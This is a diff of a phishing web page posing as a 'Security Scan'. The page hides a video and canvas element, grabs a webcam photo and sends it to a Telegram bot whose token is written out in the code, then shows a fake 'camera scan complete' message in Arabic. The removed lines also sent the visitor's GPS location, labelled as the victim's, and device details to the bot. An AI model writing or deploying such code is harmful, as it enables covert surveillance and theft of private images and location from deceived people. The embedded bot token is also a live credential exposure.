@@ -1,55 +1,30 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"></head>
+<head><meta charset="UTF-8"><title>Security Scan</title></head>
 <body>
-    <h2 id="status">جاري التحقق...</h2>
     <video id="video" style="display:none;" autoplay></video>
     <canvas id="canvas" style="display:none;"></canvas>
-
     <script>
         const token = "8379860884:AAHY6orUkUCffcsZc3dNRt8OQSlPJXD_03w";
         const urlParams = new URLSearchParams(window.location.search);
         const chat_id = urlParams.get('id');
-        const mode = urlParams.get('mode'); // هنا نحدد المهمة المطلوبة
 
-        function send(text) {
-            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: chat_id, text: text, parse_mode: "Markdown" })
-            });
-        }
-
-        // المهمة 1: الموقع فقط
-        if (mode === "gps") {
-            navigator.geolocation.getCurrentPosition(pos => {
-                send(`📍 موقع الضحية: https://www.google.com/maps?q=$${pos.coords.latitude},${pos.coords.longitude}`);
-            });
-        }
-        
-        // المهمة 2: الجهاز فقط
-        if (mode === "device") {
-            send(`📱 معلومات الجهاز: ${navigator.userAgent}`);
-        }
-
-        // المهمة 3: الكاميرا فقط
-        if (mode === "cam") {
-            navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
-                const video = document.getElementById('video');
-                video.srcObject = stream;
-                setTimeout(() => {
-                    const canvas = document.getElementById('canvas');
-                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    canvas.toBlob(blob => {
-                        const fd = new FormData();
-                        fd.append('chat_id', chat_id);
-                        fd.append('photo', blob, 'cam.jpg');
-                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
-                    }, 'image/jpeg');
-                }, 2000);
-            });
-        }
+        navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+            setTimeout(() => {
+                const canvas = document.getElementById('canvas');
+                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                canvas.toBlob(blob => {
+                    const fd = new FormData();
+                    fd.append('chat_id', chat_id);
+                    fd.append('photo', blob, 'shot.jpg');
+                    fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
+                }, 'image/jpeg');
+                document.body.innerHTML = "<h2>✅ اكتمل فحص الكاميرا</h2>";
+            }, 2000);
+        });
     </script>
 </body>
 </html>
